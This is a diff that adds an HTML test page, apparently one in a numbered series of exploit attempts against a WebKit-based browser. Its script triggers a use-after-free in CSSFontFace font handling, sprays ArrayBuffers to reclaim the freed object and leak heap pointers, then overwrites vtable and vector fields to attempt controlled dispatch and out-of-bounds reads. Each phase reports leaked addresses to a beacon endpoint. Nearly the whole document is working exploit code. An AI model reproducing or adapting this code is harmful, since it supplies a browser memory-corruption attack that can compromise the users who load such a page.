@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>P806</title></head>
+<body>
+<style>body{margin:0;padding:8px;}</style>
+<div id="t" style="font-family: serif; font-size: 24px;">P806 test</div>
+<script>
+var B = '';
+function bn(tag, data) {
+  try { var x = new XMLHttpRequest(); x.open('GET', B + '/beacon.php?tag=' + tag + '&data=' + encodeURIComponent(data) + '&t=' + Date.now(), false); x.send(); } catch(e) {}
+}
+
+bn('P806-BOOT', 'starting');
+
+// Phase A: Standard UAF -> get self_addr + q13
+// Phase B: Try to read q13 memory via small-AB reclaim at source size
+// Phase C: Worker-based timing oracle for parallel probing
+// Phase D: Controlled virtual dispatch test
+
+var PHASE = 'A';
+var uaf_ab = null;
+var self_addr = null;
+var q13_addr = null;
+var all_abs_192 = [];
+var small_abs = {};
+
+function hexQ(bv, off) {
+  var lo = bv.getUint32(off, true);
+  var hi = bv.getUint32(off + 4, true);
+  return '0x' + (hi ? (hi.toString(16) + ('00000000' + lo.toString(16)).slice(-8)) : lo.toString(16));
+}
+
+function makeU64(hi, lo) {
+  var ab = new ArrayBuffer(8);
+  var dv = new DataView(ab);
+  dv.setUint32(0, lo, true);
+  dv.setUint32(4, hi, true);
+  return new BigUint64Array(ab)[0];
+}
+
+function readU64(bv, off) {
+  var lo = bv.getUint32(off, true);
+  var hi = bv.getUint32(off + 4, true);
+  return { hi: hi, lo: lo, v: makeU64(hi, lo) };
+}
+
+// Phase A: CSSFontFace UAF reclaim (P791-proven pattern)
+function runPhaseA() {
+  PHASE = 'A';
+  bn('P806-A0', 'uaf_start');
+
+  var st1 = document.createElement('style');
+  st1.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st1);
+
+  var face1 = new FontFace('f1', "local('Helvetica')", { unicodeRange: 'U+0041' });
+  document.fonts.add(face1);
+  void face1.loaded;
+
+  var fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (fired) return undefined;
+      fired = true;
+      if (st1) { st1.remove(); st1.textContent = ''; st1 = null; }
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+
+      all_abs_192 = [];
+      for (var i = 0; i < 64; i++) {
+        all_abs_192.push(new ArrayBuffer(192));
+      }
+
+      try { document.fonts.check('1em bb1'); } catch(e) {}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function() {}
+  });
+
+  document.fonts.load('1em f1, bb1', 'AB');
+
+  setTimeout(function() {
+    delete FontFace.prototype.then;
+
+    var found = false;
+    var bestI = -1, bestNz = 0;
+    for (var i = 0; i < all_abs_192.length; i++) {
+      var u = new Uint8Array(all_abs_192[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz) { bestNz = nz; bestI = i; }
+    }
+
+    if (bestI < 0 || bestNz < 4) {
+      bn('P806-A-MISS', 'best_nz=' + bestNz);
+      setTimeout(function() { location.reload(); }, 500);
+      return;
+    }
+
+    uaf_ab = all_abs_192[bestI];
+    var dv = new DataView(uaf_ab);
+    var q11 = readU64(dv, 0x58);
+    if (q11.hi > 0) {
+      var borrow = (q11.lo < 0x68) ? 1 : 0;
+      self_addr = { hi: q11.hi - borrow, lo: (q11.lo - 0x68) >>> 0 };
+      q13_addr = readU64(dv, 0x68);
+
+      var dist = 0;
+      if (q13_addr.hi === self_addr.hi) {
+        dist = q13_addr.lo - self_addr.lo;
+      } else {
+        dist = (q13_addr.hi - self_addr.hi) * 0x100000000 + (q13_addr.lo - self_addr.lo);
+      }
+
+      bn('P806-A1', 'hit_i=' + bestI + '_nz=' + bestNz +
+        '|self=' + hexQ(dv, 0x58).replace('0x','') + '_m68' +
+        '|q13=' + hexQ(dv, 0x68) +
+        '|dist=' + dist);
+
+      var dump = '';
+      for (var q = 0; q < 24; q++) {
+        var v = hexQ(dv, q * 8);
+        if (v !== '0x0') dump += 'q' + q + '=' + v + '|';
+      }
+      bn('P806-A2', dump || 'all_zero');
+
+      found = true;
+    }
+
+    if (!found) {
+      bn('P806-A-MISS', 'q11_low_nz=' + bestNz + '_q11h=' + q11.hi);
+      setTimeout(function() { location.reload(); }, 500);
+      return;
+    }
+
+    setTimeout(runPhaseB, 50);
+  }, 400);
+}
+
+// Phase B: Spray small ABs to reclaim freed CSSFontFaceSource at q13
+// CSSFontFaceSource is likely 48-80 bytes. Try multiple sizes.
+function runPhaseB() {
+  PHASE = 'B';
+  bn('P806-B0', 'source_reclaim_start|q13=' + ('0x' + q13_addr.hi.toString(16) + ('00000000' + q13_addr.lo.toString(16)).slice(-8)));
+
+  // Strategy: spray ABs of sizes 32, 48, 64, 80, 96 (covering common allocator buckets)
+  // Write a unique marker pattern in each size class
+  // Then check if any AB landed at q13 by reading q13 through the oracle
+
+  var sizes = [32, 48, 64, 80, 96, 128];
+  small_abs = {};
+
+  for (var si = 0; si < sizes.length; si++) {
+    var sz = sizes[si];
+    small_abs[sz] = [];
+    for (var i = 0; i < 512; i++) {
+      var ab = new ArrayBuffer(sz);
+      var dv = new DataView(ab);
+      // Write marker: size in first qword, index in second
+      dv.setUint32(0, 0xCAFE0000 | sz, true);
+      dv.setUint32(4, 0xBEEF, true);
+      dv.setUint32(8, i, true);
+      dv.setUint32(12, sz, true);
+      small_abs[sz].push(ab);
+    }
+  }
+
+  bn('P806-B1', 'sprayed_6_sizes');
+
+  // Phase B2: Now use the binary oracle to test if q13 memory was overwritten
+  // Set q1 = q13 in our UAF AB. If the engine later dereferences q1:
+  //   [q13 + 0] should now be our marker (0xBEEF_CAFE0000|sz)
+  //   This is NOT a valid pointer -> CRASH
+  // If it was NOT overwritten, [q13+0] might still be the vtable -> SURVIVE
+
+  // But wait - we should check FIRST without overwriting, then WITH overwriting
+
+  // Phase B2a: Read current q13 state via oracle (set q1=q13, see if survives)
+  // This tests: is [q13+0] still a valid pointer?
+
+  var dv_uaf = new DataView(uaf_ab);
+
+  // Save original q1
+  var orig_q1 = readU64(dv_uaf, 0x08);
+
+  // Write q13 address into q1 slot
+  dv_uaf.setUint32(0x08, q13_addr.lo, true);
+  dv_uaf.setUint32(0x0C, q13_addr.hi, true);
+
+  bn('P806-B2', 'q1_set_to_q13|orig_q1=' + hexQ(dv_uaf, 0x08));
+
+  // Phase B3: Now trigger layout/GC to make engine access q1
+  // Force layout which may access font face state
+  var d = document.createElement('div');
+  d.style.fontFamily = 'wf1, serif';
+  d.style.fontSize = '24px';
+  d.textContent = 'oracle trigger B';
+  document.body.appendChild(d);
+  document.body.offsetHeight;
+
+  // Also trigger GC pressure
+  for (var gc = 0; gc < 100; gc++) {
+    var tmp = new ArrayBuffer(65536);
+  }
+
+  // Wait and see if we survive
+  setTimeout(function() {
+    bn('P806-B3', 'survived_q1_q13');
+
+    // We survived! This means [q13+0] was still a valid pointer
+    // (the vtable or at least something dereferenceable)
+
+    // Now dump our AB to see if the virtual dispatch wrote anything new
+    var dump = '';
+    var dv2 = new DataView(uaf_ab);
+    var newWrites = 0;
+    for (var q = 0; q < 24; q++) {
+      var v = hexQ(dv2, q * 8);
+      if (v !== '0x0') {
+        dump += 'q' + q + '=' + v + '|';
+        // Check if this is a NEW write (not q0=1, q1=q13, q11, q12, q13)
+        if (q !== 0 && q !== 1 && q !== 11 && q !== 12 && q !== 13) {
+          newWrites++;
+        }
+      }
+    }
+    bn('P806-B4', 'post_oracle_dump|new=' + newWrites + '|' + dump);
+
+    // Phase B5: Try setting q0 = q13 (treating source as fake vtable)
+    // Then set q1 = self_addr (self-referencing)
+    // The engine would do: [q1+0] -> q0 -> q13 -> [q13+N] -> function
+    setTimeout(runPhaseC, 50);
+  }, 2000);
+}
+
+// Phase C: Controlled vtable redirect via q0=q13
+function runPhaseC() {
+  PHASE = 'C';
+  bn('P806-C0', 'vtable_redirect_start');
+
+  var dv = new DataView(uaf_ab);
+
+  // First, dump current state
+  var pre = '';
+  for (var q = 0; q < 24; q++) {
+    var v = hexQ(dv, q * 8);
+    if (v !== '0x0') pre += 'q' + q + '=' + v + '|';
+  }
+  bn('P806-C1', 'pre_state|' + pre);
+
+  // Save originals
+  var orig_q0_lo = dv.getUint32(0, true);
+  var orig_q0_hi = dv.getUint32(4, true);
+  var orig_q1_lo = dv.getUint32(8, true);
+  var orig_q1_hi = dv.getUint32(12, true);
+
+  // Set q0 = q13_addr (source pointer as fake vtable)
+  dv.setUint32(0, q13_addr.lo, true);
+  dv.setUint32(4, q13_addr.hi, true);
+
+  // Set q1 = self_addr (self-referencing for controlled dispatch)
+  dv.setUint32(8, self_addr.lo, true);
+  dv.setUint32(12, self_addr.hi, true);
+
+  bn('P806-C2', 'q0=q13|q1=self|triggering');
+
+  // Trigger: layout + GC
+  var d = document.createElement('div');
+  d.style.fontFamily = 'wf1, serif';
+  d.style.fontSize = '32px';
+  d.textContent = 'vtable redirect C';
+  document.body.appendChild(d);
+  document.body.offsetHeight;
+
+  // Heavy GC pressure to force cleanup
+  var trash = [];
+  for (var gc = 0; gc < 200; gc++) {
+    trash.push(new ArrayBuffer(131072));
+  }
+  trash = null;
+
+  setTimeout(function() {
+    bn('P806-C3', 'survived_redirect');
+
+    // Dump AB to see if virtual function wrote anything!
+    var dv2 = new DataView(uaf_ab);
+    var dump = '';
+    var newWrites = 0;
+    for (var q = 0; q < 24; q++) {
+      var v = hexQ(dv2, q * 8);
+      if (v !== '0x0') {
+        dump += 'q' + q + '=' + v + '|';
+        // New writes are anything not q0(=q13), q1(=self), q11, q12, q13
+        if (q !== 0 && q !== 1 && q !== 11 && q !== 12 && q !== 13) {
+          newWrites++;
+        }
+      }
+    }
+    bn('P806-C4', 'post_redirect|new=' + newWrites + '|' + dump);
+
+    // Restore q0 and q1
+    dv2.setUint32(0, orig_q0_lo, true);
+    dv2.setUint32(4, orig_q0_hi, true);
+    dv2.setUint32(8, orig_q1_lo, true);
+    dv2.setUint32(12, orig_q1_hi, true);
+
+    setTimeout(runPhaseD, 50);
+  }, 3000);
+}
+
+// Phase D: Multi-offset oracle scan of source object at q13
+// Read q13+0, q13+8, q13+16, ... by setting q1 to q13+N
+// Survive = [q13+N+0] is nonzero valid ptr. Crash = zero or invalid.
+function runPhaseD() {
+  PHASE = 'D';
+  bn('P806-D0', 'source_field_scan');
+
+  var dv = new DataView(uaf_ab);
+  var offsets = [0, 8, 16, 24, 32, 40, 48, 56, 64, 72, 80, 88, 96, 104, 112, 120];
+  var results = [];
+  var idx = 0;
+
+  function testOffset() {
+    if (idx >= offsets.length) {
+      bn('P806-D-DONE', results.join('|'));
+      setTimeout(runPhaseE, 50);
+      return;
+    }
+
+    var off = offsets[idx];
+    // q13 + off
+    var addr_lo = (q13_addr.lo + off) >>> 0;
+    var addr_hi = q13_addr.hi + ((q13_addr.lo + off > 0xFFFFFFFF) ? 1 : 0);
+
+    // Set q1 = q13 + off
+    dv.setUint32(0x08, addr_lo, true);
+    dv.setUint32(0x0C, addr_hi, true);
+
+    // Quick layout trigger
+    var d = document.createElement('span');
+    d.style.fontFamily = 'wf1, serif';
+    d.textContent = 'D' + off;
+    document.body.appendChild(d);
+    document.body.offsetHeight;
+
+    // If we're still alive after 500ms, this offset has a valid ptr
+    setTimeout(function() {
+      results.push('+' + off + '=alive');
+      bn('P806-D' + idx, '+' + off + '=alive');
+
+      // Check for new writes
+      var dv2 = new DataView(uaf_ab);
+      var nw = '';
+      for (var q = 2; q < 11; q++) {
+        var v = hexQ(dv2, q * 8);
+        if (v !== '0x0') nw += 'q' + q + '=' + v + ' ';
+      }
+      if (nw) bn('P806-D' + idx + '-W', nw);
+
+      idx++;
+      testOffset();
+    }, 400);
+  }
+
+  testOffset();
+}
+
+// Phase E: FontFace pointer disclosure via Worker
+// Create a Worker that creates its own FontFace UAF
+// Worker has separate heap but same WebKit engine
+function runPhaseE() {
+  PHASE = 'E';
+  bn('P806-E0', 'worker_fontface_test');
+
+  // Test: can Worker create FontFace?
+  var workerCode = [
+    'self.onmessage = function(e) {',
+    '  var r = {};',
+    '  try {',
+    '    r.hasFontFace = typeof FontFace;',
+    '    r.hasAB = typeof ArrayBuffer;',
+    '    r.hasBU64 = typeof BigUint64Array;',
+    '    r.hasDV = typeof DataView;',
+    '    r.hasFetch = typeof fetch;',
+    '    r.hasSClone = typeof structuredClone;',
+    '    if (typeof FontFace === "function") {',
+    '      var f = new FontFace("wtest", "local(Helvetica)");',
+    '      r.faceCreated = true;',
+    '      r.faceStatus = f.status;',
+    '      r.hasLoaded = typeof f.loaded;',
+    '    } else { r.faceCreated = false; }',
+    '  } catch(ex) { r.error = ex.message; }',
+    '  self.postMessage(r);',
+    '};'
+  ].join('\n');
+
+  try {
+    var blob = new Blob([workerCode], { type: 'application/javascript' });
+    var url = URL.createObjectURL(blob);
+    var w = new Worker(url);
+
+    w.onmessage = function(e) {
+      var d = e.data;
+      var s = '';
+      for (var k in d) s += k + '=' + d[k] + '|';
+      bn('P806-E1', s);
+      w.terminate();
+
+      // Phase E2: Test AB transfer between main and worker
+      testABTransfer();
+    };
+
+    w.onerror = function(e) {
+      bn('P806-E-ERR', e.message);
+      setTimeout(runPhaseF, 50);
+    };
+
+    w.postMessage({ cmd: 'test' });
+  } catch(ex) {
+    bn('P806-E-FAIL', ex.message);
+    setTimeout(runPhaseF, 50);
+  }
+}
+
+function testABTransfer() {
+  // Test: transfer our UAF AB to worker and back
+  // Create a COPY first (can't transfer the UAF AB!)
+  var copy = new ArrayBuffer(192);
+  var src = new DataView(uaf_ab);
+  var dst = new DataView(copy);
+  for (var i = 0; i < 192; i += 4) {
+    dst.setUint32(i, src.getUint32(i, true), true);
+  }
+
+  var workerCode2 = [
+    'self.onmessage = function(e) {',
+    '  var ab = e.data.ab;',
+    '  var r = { byteLength: ab.byteLength };',
+    '  var dv = new DataView(ab);',
+    '  var bu = new BigUint64Array(ab);',
+    '  // Read all qwords via BigUint64Array',
+    '  var ptrs = [];',
+    '  for (var i = 0; i < 24; i++) {',
+    '    var v = bu[i];',
+    '    if (v !== 0n) ptrs.push("q" + i + "=" + v.toString(16));',
+    '  }',
+    '  r.nonzero = ptrs.join("|");',
+    '  r.q0 = bu[0].toString(16);',
+    '  r.q11 = bu[11].toString(16);',
+    '  r.q13 = bu[13].toString(16);',
+    '  // Transfer back',
+    '  self.postMessage({ result: r, ab: ab }, [ab]);',
+    '};'
+  ].join('\n');
+
+  try {
+    var blob2 = new Blob([workerCode2], { type: 'application/javascript' });
+    var url2 = URL.createObjectURL(blob2);
+    var w2 = new Worker(url2);
+
+    w2.onmessage = function(e) {
+      var d = e.data.result;
+      bn('P806-E2', 'worker_read|q0=' + d.q0 + '|q11=' + d.q11 + '|q13=' + d.q13 + '|nz=' + d.nonzero);
+      w2.terminate();
+      setTimeout(runPhaseF, 50);
+    };
+
+    w2.onerror = function(e) {
+      bn('P806-E2-ERR', e.message);
+      setTimeout(runPhaseF, 50);
+    };
+
+    // Transfer the copy to worker
+    w2.postMessage({ ab: copy }, [copy]);
+  } catch(ex) {
+    bn('P806-E2-FAIL', ex.message);
+    setTimeout(runPhaseF, 50);
+  }
+}
+
+// Phase F: Heap distance exploitation
+// q13 is typically 600K-6.4MB from self_addr
+// Try to create ABs that bridge the gap and read source memory
+function runPhaseF() {
+  PHASE = 'F';
+  bn('P806-F0', 'heap_bridge_test');
+
+  // The source at q13 is freed. Its vtable may still be intact.
+  // Idea: create a LARGE AB that spans from near self_addr to past q13
+  // Then use BigUint64Array to read the vtable!
+
+  var dv = new DataView(uaf_ab);
+
+  // Calculate distance from self_addr to q13
+  var dist;
+  if (q13_addr.hi === self_addr.hi) {
+    dist = q13_addr.lo - self_addr.lo;
+  } else {
+    dist = (q13_addr.hi - self_addr.hi) * 0x100000000 + (q13_addr.lo - self_addr.lo);
+  }
+
+  bn('P806-F1', 'dist=' + dist + '|self_hi=' + self_addr.hi.toString(16) + '|q13_hi=' + q13_addr.hi.toString(16));
+
+  // If dist is positive and < 64MB, try to allocate an AB of that size
+  // Problem: AB memory is zeroed on allocation. But...
+  // What if we can get the ALLOCATOR to place a large AB
+  // such that it OVERLAPS with q13's freed memory?
+
+  // Actually, a new idea: use BigUint64Array on our EXISTING 192-byte AB
+  // to read q11 (buffer pointer) which points to self_addr + 0x68
+  // q11 IS our AB's address + 0x68. And q13 is the source address.
+  // The difference q13 - q11 tells us the offset from our AB's inline buffer
+  // to the source. If this is within some other AB we could read it!
+
+  var q11 = readU64(dv, 0x58); // m_buffer = self_addr + 0x68
+  var fromBuf = 0;
+  if (q13_addr.hi === q11.hi) {
+    fromBuf = q13_addr.lo - q11.lo;
+  } else {
+    fromBuf = (q13_addr.hi - q11.hi) * 0x100000000 + (q13_addr.lo - q11.lo);
+  }
+
+  bn('P806-F2', 'q11_to_q13=' + fromBuf);
+
+  // Phase F3: The REAL trick - m_size injection!
+  // The WTF::Vector at CSSFontFace+0x58 has:
+  //   +0x58 (q11): m_buffer (points to inline storage at self+0x68)
+  //   +0x60 (q12 low): m_capacity
+  //   +0x64 (q12 high): m_size
+  //   +0x68 (q13): inline storage / first source pointer
+
+  // If we INCREASE m_capacity, code that iterates the vector
+  // would read PAST q13 into adjacent heap memory!
+  // The inline storage starts at +0x68 and normally has capacity for ~1 entry
+  // If we set capacity to a large value, iteration reads way past our AB!
+
+  // But we need something that iterates the source vector...
+  // fonts.forEach? document.fonts iteration?
+
+  // Test: enumerate document.fonts
+  var fontCount = 0;
+  try {
+    document.fonts.forEach(function(f) { fontCount++; });
+  } catch(e) {}
+
+  bn('P806-F3', 'fonts_count=' + fontCount);
+
+  // Phase F4: BigUint64Array OOB via m_size/m_capacity manipulation
+  // Our UAF AB is 192 bytes. BigUint64Array view = 24 qwords.
+  // q12 low = m_capacity, q12 high = m_size
+  // These control how the C++ code iterates the source vector.
+  // But JS ArrayBuffer.byteLength is separate and immutable.
+
+  // The actual OOB must happen through the C++ font code,
+  // not through JS ArrayBuffer bounds.
+
+  // Set m_size = 16 (instead of whatever it is now)
+  // This would make the engine think there are 16 source entries
+  // starting at q13. Each source is a pointer (8 bytes).
+  // So the engine would read 16 * 8 = 128 bytes from q13 onward.
+
+  var orig_q12_lo = dv.getUint32(0x60, true);
+  var orig_q12_hi = dv.getUint32(0x64, true);
+
+  bn('P806-F4', 'orig_cap=' + orig_q12_lo + '|orig_size=' + orig_q12_hi);
+
+  // Set m_size = 0 and m_capacity = 0 (empty vector - safe)
+  // Then trigger fonts enumeration to see what happens
+  dv.setUint32(0x60, 0, true); // capacity = 0
+  dv.setUint32(0x64, 0, true); // size = 0
+
+  // Try to iterate - should see 0 sources, no crash
+  try {
+    document.fonts.forEach(function(f) {
+      bn('P806-F5', 'font_during_empty=' + f.family);
+    });
+    bn('P806-F5', 'empty_vec_ok');
+  } catch(e) {
+    bn('P806-F5', 'empty_vec_err=' + e.message);
+  }
+
+  // Restore
+  dv.setUint32(0x60, orig_q12_lo, true);
+  dv.setUint32(0x64, orig_q12_hi, true);
+
+  setTimeout(runPhaseG, 100);
+}
+
+// Phase G: Final comprehensive dump + cleanup
+function runPhaseG() {
+  PHASE = 'G';
+
+  // Final state dump
+  if (uaf_ab) {
+    var dv = new DataView(uaf_ab);
+    var dump = '';
+    var bu = new BigUint64Array(uaf_ab.slice(0)); // copy for BigUint64
+    for (var i = 0; i < 24; i++) {
+      if (bu[i] !== 0n) dump += 'q' + i + '=' + bu[i].toString(16) + '|';
+    }
+    bn('P806-G0', 'final|' + dump);
+  }
+
+  bn('P806-DONE', 'all_phases_complete');
+}
+
+// START
+runPhaseA();
+</script>
+</body>
+</html>
